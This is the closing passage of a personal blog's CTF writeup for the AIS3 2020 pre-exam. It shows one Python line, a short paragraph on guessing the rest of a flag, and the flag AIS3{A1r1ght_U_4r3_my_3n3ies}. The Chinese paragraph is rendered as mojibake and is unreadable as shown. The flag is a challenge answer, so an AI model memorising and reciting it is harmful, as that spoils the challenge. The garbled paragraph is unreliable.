    <span class="n">cur_min</span> <span class="o">=</span> <span class="n">Manager</span><span class="p">().</span><span class="nb">list</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)))))</span>

</code></pre></div></div>

<p>æˆ‘æˆ³åˆ° <code class="language-plaintext highlighter-rouge">AIS3{A1r1ght_U_4r3_my_3n3</code> é€™è£¡å¤§æ¦‚å°±çŸ¥é“å‰©ä¸‹æ‡‰è©²æ˜¯ <code class="language-plaintext highlighter-rouge">enemies</code>ï¼Œæ‰€ä»¥å‰›å¥½å°±çŒœä¸­äº†ã€‚</p>

<p>Flag:
<code class="language-plaintext highlighter-rouge">AIS3{A1r1ght_U_4r3_my_3n3ies}</code></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#zh-tw" class="page__taxonomy-item" rel="tag">zh-tw</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-28T00:00:00+08:00">June 28, 2020</time></p>


      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?via=StillAzureH&text=AIS3+2020+Pre-exam+Writeup+%28%E4%B8%AD%E6%96%87%29%20https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fstillu.cc%2Fwriteup%2F2020%2F06%2F28%2Fais3-preexam-zh-2020%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/writeup/2020/06/23/capture-the-nitro/" class="pagination--pager" title="Capture the Nitro Writeup
">Previous</a>
    
    
      <a href="/rambling/2020/06/29/internet-and-its-absurdity/" class="pagination--pager" title="The Current State of the Internet and its Absurdity
">Next</a>
    
  </nav>

    </div>

    
      <div class="page__comments">
  
  
      <h4 class="page__comments-title">Leave a comment</h4>
      <section id="utterances-comments"></section>
    
</div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/ida-tips/2022/01/22/saved-desktops-across-32bit-64bit/" rel="permalink">IDA Trickeries #1: Using Saved Desktop Across IDAs
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2022-01-22T00:00:00+08:00">January 22, 2022</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">So likeâ€¦ who at Hex-rays implemented this?
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/threat-spotlight/2021/11/13/domain-fronting-fastly/" rel="permalink">Threat Spotlight - Domain Fronting
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-11-13T00:00:00+08:00">November 13, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          5 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Fast(ly) but deadly.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/personal/2021/10/29/barinsta-and-facebook/" rel="permalink">Facebook, Monopoly, and Barinsta
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-10-29T00:00:00+08:00">October 29, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Facebook and its anti-competitive strategy.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/personal/2021/07/12/lockdown-taiwan-2021/" rel="permalink">Lockdown, Taiwan, 2021
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-07-12T00:00:00+08:00">July 12, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          2 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Impact of lockdown in Taiwan and my personal life.
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 Still Hsu. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6FGTZBMTZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-N6FGTZBMTZ', { 'anonymize_ip': false});
</script>






    <script>
  'use strict';

  (function() {
    var commentContainer = document.querySelector('#utterances-comments');

    if (!commentContainer) {
      return;
    }

    var script = document.createElement('script');
    script.setAttribute('src', 'https://utteranc.es/client.js');
    script.setAttribute('repo', 'Still34/landing');
    script.setAttribute('issue-term', 'pathname');
    script.setAttribute('theme', 'github-dark');
    script.setAttribute('crossorigin', 'anonymous');

    commentContainer.appendChild(script);
  })();
</script>

  





  </body>
</html>
